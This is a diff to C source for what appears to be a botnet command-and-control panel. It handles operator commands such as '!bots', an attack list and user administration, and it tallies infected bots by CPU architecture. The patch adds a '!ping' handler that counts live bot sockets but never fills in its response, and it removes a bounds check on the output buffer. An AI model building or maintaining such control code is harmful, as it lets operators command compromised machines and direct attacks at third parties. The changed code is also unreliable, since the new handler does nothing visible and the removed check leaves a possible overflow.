@@ -22,6 +22,8 @@ void handle_adduser_command(const User *user, int client_socket);
 void handle_removeuser_command(const User *user, const char *command, char *response);
 void handle_kickuser_command(const User *user, const char *command, char *response);
 void handle_admin_command(const User *user, char *response);
+void handle_ping_command(char *response);
+
 /*
 H E L P   C O M M A N D
 */
@@ -327,6 +329,8 @@ void process_command(const User *user, const char *command, int client_socket, c
         handle_attack_list_command(response_buf);
     } else if (strcmp(command, "!bots") == 0) {
         handle_bots_command(response_buf);
+    } else if (strcmp(command, "!ping") == 0) {
+        handle_ping_command(response_buf);
     } else if (strcmp(command, "!clear") == 0) {
         handle_clear_command(response_buf);
     } else if (strcmp(command, "!opthelp") == 0) {
@@ -534,7 +538,6 @@ void handle_bots_command(char *response) {
     for (int i = 0; i < bot_count; i++) {
         if (!bots[i].is_valid) continue;
         valid_bots++;
-        
         int found = 0;
         for (int j = 0; j < 12 && !found; j++) {
             if (strcmp(bots[i].arch, arch_names[j]) == 0) {
@@ -542,15 +545,12 @@ void handle_bots_command(char *response) {
                 found = 1;
             }
         }
-        if (!found) arch_count[11]++; // unknown (no kill)
     }
     pthread_mutex_unlock(&bot_mutex);
-
-    offset = snprintf(response, MAX_COMMAND_LENGTH, YELLOW "All bots: %d\r\n" RESET, valid_bots);
+    offset = snprintf(response, MAX_COMMAND_LENGTH, "\033[1;33mAll bots: %d\n\033[0m", valid_bots);
     for (int i = 0; i < 12; i++) {
         if (arch_count[i] > 0) {
-            offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, BLUE "%s: %d\r\n" RESET, arch_names[i], arch_count[i]);
-            if (offset >= MAX_COMMAND_LENGTH - 1) break;
+            offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, "\033[1;34m%s: %d\n\033[0m", arch_names[i], arch_count[i]);
         }
     }
 }
@@ -961,4 +961,15 @@ void handle_admin_command(const User *user, char *response) {
              "!adduser - Add a new user\r\n"
              "!removeuser <username> - Remove a user\r\n"
              "!kickuser <username> - Kick a connected user\r\n" RESET);
+}
+
+void handle_ping_command(char *response) {
+    int valid_bots = 0;
+    pthread_mutex_lock(&bot_mutex);
+    int count = bot_count;
+    if (count > MAX_BOTS) count = MAX_BOTS;
+    for (int i = 0; i < count; i++) {
+        if (bots[i].is_valid && bots[i].socket > 0) valid_bots++;
+    }
+    pthread_mutex_unlock(&bot_mutex);
 }
